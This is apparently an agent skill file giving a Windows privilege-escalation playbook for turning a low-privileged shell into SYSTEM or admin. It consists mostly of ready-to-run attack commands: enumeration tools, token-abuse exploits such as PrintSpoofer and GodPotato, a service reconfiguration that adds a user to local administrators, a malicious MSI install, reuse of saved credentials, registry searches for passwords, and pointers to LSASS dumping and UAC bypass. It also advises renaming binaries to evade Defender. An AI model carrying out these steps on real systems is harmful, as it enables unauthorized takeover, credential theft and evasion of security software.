---
name: privesc-win
description: "Windows privilege escalation: token abuse, service misconfiguration, unquoted paths, and credential exposure. Use this skill when a low-privileged Windows shell must become SYSTEM or admin."
---

# Windows Privesc

## Overview

Windows privesc is token and permission abuse. Enumerate privileges and services first.

## Enumerate

```powershell
whoami /all
whoami /priv
systeminfo
wmic qfe list brief
```

```bash
winpeas.exe
Seatbelt.exe -group=all
PowerUp.ps1; Invoke-AllChecks
```

## Token privileges

| Privilege | Abuse |
|---|---|
| `SeImpersonatePrivilege` | PrintSpoofer, GodPotato, JuicyPotato |
| `SeAssignPrimaryToken` | same |
| `SeBackupPrivilege` | copy SAM/SYSTEM |
| `SeRestorePrivilege` | overwrite system files |
| `SeTakeOwnership` | own any file |
| `SeDebugPrivilege` | dump LSASS |
| `SeLoadDriver` | load a vulnerable driver |

```bash
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
```

## Service misconfiguration

```powershell
# unquoted service path
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /v /i "c:\windows"
# write to C:\Program.exe if path is C:\Program Files\App\svc.exe

# weak service permissions
accesschk.exe -uwcqv "Everyone" *
sc config vuln binPath= "cmd /c net localgroup administrators user /add"
sc stop vuln; sc start vuln
```

## AlwaysInstallElevated

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /i evil.msi /qn
```

## Stored credentials

```powershell
cmdkey /list
# runas with saved creds
runas /savecred /user:admin cmd
```

```bash
# unattend files
dir /s /b C:\unattend.xml C:\sysprep\*.xml 2>nul
# registry
reg query HKLM /f password /t REG_SZ /s
```

## Scheduled tasks

```powershell
schtasks /query /fo LIST /v
# writable task binary -> replace it
```

## UAC bypass (admin but not elevated)

```bash
fodhelper.exe exploit via registry
UACME / bypass tools
```

## Pitfalls

- `SeImpersonate` requires a service context (IIS, MSSQL) — it is not present in a normal shell.
- Defender blocks known potato binaries; rename and/or use a fresh build.
- AV signatures change daily.

## Verification

`whoami /groups` must show the elevated group after the escalation.
